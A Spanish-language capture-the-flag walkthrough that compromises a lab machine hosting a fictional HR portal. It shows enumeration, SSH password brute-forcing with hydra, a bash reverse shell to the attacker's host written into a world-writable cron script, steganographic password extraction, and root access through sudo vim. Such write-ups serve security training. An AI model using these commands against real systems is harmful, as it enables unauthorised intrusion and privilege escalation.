Después de desplegar la máquina nos dice que su IP es 172.17.0.2, comprobamos trazabilidad
```bash
ping -c 1 172.17.0.2
```
```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.035 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.035/0.035/0.035/0.000 ms
```
1 paquete transmitido, 1 recibido, cero perdidos, está todo correcto

## FASE DE ENUMERACIÓN

Vamos a enumerar los puertos abiertos, ver que servicios corren por ellos y su versión por si hay alguna vulnerabilidad:
```bash
sudo nmap -sS -sCV -Pn --min-rate 5000 -p- -vvv --open 172.17.0.2 -oN PuertosYservicios
```
```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
| ssh-hostkey: 
|   256 35:ff:c4:8b:c4:e1:46:12:43:b9:03:a9:cf:ec:f3:0a (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMLcU0NdLlcMjGTvMebPUhkYyTefstC3io0s5l3Mx8OHiNGXN2kbbXgN2v5q/leJOxatqm0YaNUXO0fFc8nHCok=
|   256 23:ac:95:1e:be:33:9e:ed:14:f0:45:f6:27:51:ca:ba (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOOKYORvyjT35RDCNPL0y+KJc/uIqXKC8OskWAJEmmqS
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: GateKeeper HR | Tu Portal de Recursos Humanos
```

Puerto 22 con ssh en versión no vulnerable y sin credenciales. Vamos a centrarnos en el 80.
lanzamos un whatweb para ver si reporta algo interesante:
```bash
whatweb http://172.17.0.2
```
```
http://172.17.0.2 [200 OK] Apache[2.4.62], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.62 (Debian)], IP[172.17.0.2], PasswordField[password], Script, Title[GateKeeper HR | Tu Portal de Recursos Humanos], UncommonHeaders[x-virtual-host]
```

veo esto: UncommonHeaders[x-virtual-host] , lo cual me hace pensar en virtualhostin, abro la página y miro el código fuente y veo esto:

```
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GateKeeper HR | Tu Portal de Recursos Humanos</title>
    <link rel="dns-prefetch" href="//gatekeeperhr.com" />
```
así pués lo añado en el /etc/hosts, además no me deja abrir nada de la página. 

 ```bash
sudo nano /etc/hosts
```
```
172.17.0.2      gatekeeperhr.com
```
antes de abrir el dominio compruebo si hay más subdominios:
```bash
 wfuzz -c --hc=404 --hh=3861 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.gatekeeperhr.com" http://gatekeeperhr.com/
```
```
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://gatekeeperhr.com/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                     
=====================================================================

000000001:   200        108 L    235 W      3971 Ch     "www"
```
hay uno más que añado al /etc/hosts qyedando así la cosa:
```
172.17.0.2      gatekeeperhr.com www.gatekeeperhr.com
```

hago fuzzing y encuentro esta rutas:
```
200      GET      241l      406w     3387c http://gatekeeperhr.com/css/styles.css

200      GET        1l       89w    14999c http://gatekeeperhr.com/js/script.js

200      GET      108l      235w     3971c http://gatekeeperhr.com/

200      GET      108l      235w     3971c http://gatekeeperhr.com/index.html

200      GET       92l      188w     3140c http://gatekeeperhr.com/contact.html

200      GET       90l      231w     3339c http://gatekeeperhr.com/about.html

301      GET        9l       28w      319c http://gatekeeperhr.com/spam => http://gatekeeperhr.com/spam/

301      GET        9l       28w      322c http://gatekeeperhr.com/default => http://gatekeeperhr.com/default/

301      GET        9l       28w      318c http://gatekeeperhr.com/css => http://gatekeeperhr.com/css/

301      GET        9l       28w      323c http://gatekeeperhr.com/includes => http://gatekeeperhr.com/includes/

301      GET        9l       28w      317c http://gatekeeperhr.com/js => http://gatekeeperhr.com/js/

301      GET        9l       28w      318c http://gatekeeperhr.com/lab => http://gatekeeperhr.com/lab/

200      GET        0l        0w        0c http://gatekeeperhr.com/includes/db.php

200      GET      241l      406w     3387c http://gatekeeperhr.com/default/styles.css

200      GET      107l      220w     3861c http://gatekeeperhr.com/default/index.html

200      GET       14l       32w      308c http://gatekeeperhr.com/spam/index.html

405      GET        1l        4w       61c http://gatekeeperhr.com/lab/login.php

200      GET        1l       14w      867c http://gatekeeperhr.com/lab/employees.php
```

abro  http://gatekeeperhr.com/lab/employees.php y me encuentro esto:
```
{"status":"success","employees":[{"id":"1","name":"Ana Garcia","department":"Ventas","startDate":"2023-05-15"},{"id":"2","name":"Carlos Rodriguez","department":"IT","startDate":"2023-06-01"},{"id":"3","name":"Maria Lopez","department":"Recursos Humanos","startDate":"2023-06-10"},{"id":"4","name":"Juan Martinez","department":"Marketing","startDate":"2023-06-15"},{"id":"5","name":"Laura Sanchez","department":"Finanzas","startDate":"2023-07-01"},{"id":"6","name":"Pedro Ramirez","department":"Pasantia IT","startDate":"2023-07-05"},{"id":"7","name":"Sofia Torres","department":"Ventas","startDate":"2023-07-10"},{"id":"8","name":"Diego Herrera","department":"IT","startDate":"2023-07-15"},{"id":"9","name":"Valentina Gomez","department":"Pasantia IT","startDate":"2023-07-20"},{"id":"10","name":"Alejandro Vargas","department":"Marketing","startDate":"2023-07-25"}]}

```

así pues me creo un diccionario de nombres:

```
anagarcia
carlosrodriguez
marialopez
juanmartinez
laurasanchez
pedroramirez
sofiatorres
diegoherrera
valentinagomez
alejandrovargas
ana
carlos
maria
juan
laura
pedro
sofia
diego
valentina
alejandro
garcia
rodriguez
lopez
martinez
sanchez
ramirez
torres
herrera
gomez
vargas
```

luego voy a esta ruta: http://gatekeeperhr.com/spam/index.html y en su código fuente veo esto:
```
<!-- Yn pbagenfrñn qr hab qr ybf cnfnagrf rf 'checy3' -->
```
Veo que se trata de algún tipo de codificación al paso de un tiempo me doy cuenta que es rot13 y lo decodifico online viendo eso:
```
<!-- La contraseaa de uno de los pasantes es 'purpl3' -->
```

tengo un diccionario y una contraseña, así pues vamos a intentar penetrar


## FASE INTRUSIÓN

Teniendo un diccionario y una pass vamos a lanzar un ataque al puerto 22 para ver si podemos conectarnos por ssh:

```bash
hydra -L nombres.txt -p purpl3 -t 16 -V -f -I ssh://172.17.0.2
```
```                                                                                                                   
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-13 14:02:29
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 30 login tries (l:30/p:1), ~2 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[ATTEMPT] target 172.17.0.2 - login "anagarcia" - pass "purpl3" - 1 of 30 [child 0] (0/0)
[ATTEMPT] target 172.17.0.2 - login "carlosrodriguez" - pass "purpl3" - 2 of 30 [child 1] (0/0)
[ATTEMPT] target 172.17.0.2 - login "marialopez" - pass "purpl3" - 3 of 30 [child 2] (0/0)
[ATTEMPT] target 172.17.0.2 - login "juanmartinez" - pass "purpl3" - 4 of 30 [child 3] (0/0)
[ATTEMPT] target 172.17.0.2 - login "laurasanchez" - pass "purpl3" - 5 of 30 [child 4] (0/0)
[ATTEMPT] target 172.17.0.2 - login "pedroramirez" - pass "purpl3" - 6 of 30 [child 5] (0/0)
[ATTEMPT] target 172.17.0.2 - login "sofiatorres" - pass "purpl3" - 7 of 30 [child 6] (0/0)
[ATTEMPT] target 172.17.0.2 - login "diegoherrera" - pass "purpl3" - 8 of 30 [child 7] (0/0)
[ATTEMPT] target 172.17.0.2 - login "valentinagomez" - pass "purpl3" - 9 of 30 [child 8] (0/0)
[ATTEMPT] target 172.17.0.2 - login "alejandrovargas" - pass "purpl3" - 10 of 30 [child 9] (0/0)
[ATTEMPT] target 172.17.0.2 - login "ana" - pass "purpl3" - 11 of 30 [child 10] (0/0)
[ATTEMPT] target 172.17.0.2 - login "carlos" - pass "purpl3" - 12 of 30 [child 11] (0/0)
[ATTEMPT] target 172.17.0.2 - login "maria" - pass "purpl3" - 13 of 30 [child 12] (0/0)
[ATTEMPT] target 172.17.0.2 - login "juan" - pass "purpl3" - 14 of 30 [child 13] (0/0)
[ATTEMPT] target 172.17.0.2 - login "laura" - pass "purpl3" - 15 of 30 [child 14] (0/0)
[ATTEMPT] target 172.17.0.2 - login "pedro" - pass "purpl3" - 16 of 30 [child 15] (0/0)
[22][ssh] host: 172.17.0.2   login: pedro   password: purpl3
[STATUS] attack finished for 172.17.0.2 (valid pair found)
```

tenemos el user pedro y el pass purpl3

nos conectamos por ssh:
```bash
ssh pedro@172.17.0.2
```
Ya somos pedro

## FASE ESCALADA DE PRIVILEGIOS

realizamos un cat al passwd para ver los usuarios que hay:

```bash
cat /etc/passwd | grep sh$
```
```
root:x:0:0:root:/root:/bin/bash
pedro:x:1000:1000::/home/pedro:/bin/bash
valentina:x:1001:1001::/home/valentina:/bin/bash
```
apàrte de pedro está valentina y root, to empiezo siempre con id, para ver si hay algún grupo privilegiado,
despues con printenv que he llegado a ver contraseñas en texto claro en la variable de entorno, despues permisos suid y luego procesos
en permisos suid vemos:
```
find / -perm -4000 2>/dev/null
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/exim4
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
exim4, pero después de dar vueltas en un rabit hole, entonces miro los procesos con:
```bash
ps aux
```
y veo algo interesante:
```
valenti+     384  0.0  0.0   2576  1536 ?        Ss   15:05   0:00 /bin/sh -c sleep 45; /opt/log_cleaner.sh
```
valentina ejecuta ese proceso, y mirando los permisos:
```
pedro@837792129ca1:/tmp$ ls -la /opt/log_cleaner.sh
-rwxrw-rw- 1 valentina valentina 52 Feb 16 13:26 /opt/log_cleaner.sh
```
veo que puedo sobreescribir el script así pues hago lo siguiente:
```bash
echo '#!/bin/bash' > /opt/log_cleaner.sh
echo "bash -i >& /dev/tcp/172.17.0.1/445 0>&1" >> /opt/log_cleaner.sh
```

abro con nc en el puerto 445 un listener:
```bash
sudo nc -nvlp 445
```
y al cabo de un poco se conecta como valentina.
hago tratamiento de la tty:
```bash
export TERM=xterm
export SHELL=bash
script /dev/null -c bash 
^Z
stty raw -echo; fg
reset xterm
stty rows 51 columns 237
```
en su home veo el archivo: profile_picture.jpeg

lo copio en /tmp

```bash
cp profile_picture.jpeg /tmp
```
y le asigno permisos:
```bash
chmod 644 /tmp/profile_picture.jpeg
```

ahora siendo pedro monto un servidor php:
```bash
php -S 0.0.0.0:8080 -t /tmp
```
y desde mi kali me bajo el archivo:
```bash
 wget http://172.17.0.2:8080/profile_picture.jpeg
```
```
--2025-02-16 10:47:14--  http://172.17.0.2:8080/profile_picture.jpeg
Conectando con 172.17.0.2:8080... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 44990 (44K) [image/jpeg]
Grabando a: «profile_picture.jpeg»

profile_picture.jpeg                                        100%[========================================================================================================================================>]  43,94K  --.-KB/s    en 0s      

2025-02-16 10:47:14 (2,03 GB/s) - «profile_picture.jpeg» guardado [44990/44990]
```

vamos a indagar en el archivo, primero uso exiftool:
```
exiftool profile_picture.jpeg                                                                                                                                                ░▒▓ ✔ │ 6s   
ExifTool Version Number         : 12.76
File Name                       : profile_picture.jpeg
Directory                       : .
File Size                       : 45 kB
File Modification Date/Time     : 2025:02:16 10:47:14-05:00
File Access Date/Time           : 2025:02:16 10:47:32-05:00
File Inode Change Date/Time     : 2025:02:16 10:47:14-05:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 400
Image Height                    : 400
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
Image Size                      : 400x400
Megapixels                      : 0.160
```
no hay nada y paso steghide:
```bash
steghide info profile_picture.jpeg
```
```
"profile_picture.jpeg":
  formato: jpeg
  capacidad: 2,4 KB
�Intenta informarse sobre los datos adjuntos? (s/n) s
Anotar salvoconducto: 
  archivo adjunto "secret.txt":
    tama�o: 7,0 Byte
    encriptado: rijndael-128, cbc
    compactado: si
```

tenemos un archivo oculto, lo vamos a extraer:
```bash
steghide extract -sf profile_picture.jpeg
```
y después abrimos el archivo extraido:
```bash
cat secret.txt
```
```
mag1ck
```

un pass, nos vamos a valentina y lanzamos sudo -l que ahora tenemos un pass:

```
Matching Defaults entries for valentina on 837792129ca1:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty, listpw=always

User valentina may run the following commands on 837792129ca1:
    (ALL : ALL) PASSWD: ALL, NOPASSWD: /usr/bin/vim
```
vamos a nuestra pagina de binarios favorita y buscamos vim:
```bash
https://gtfobins.github.io/gtfobins/vim/#sudo
```

y evmos la forma de abusar del binario con sudo:
```
sudo vim -c ':!/bin/sh'
```

vamos a probarlo ajustandolo un poco:
```bash
sudo -u root /usr/bin/vim -c ':!/bin/sh'
```
y ya somos root:
```
# id
uid=0(root) gid=0(root) groups=0(root)
# 
```
